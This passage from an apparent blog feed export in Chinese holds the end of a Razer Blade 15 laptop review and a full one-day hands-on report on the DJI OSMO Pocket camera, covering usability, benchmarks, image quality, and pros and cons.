带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]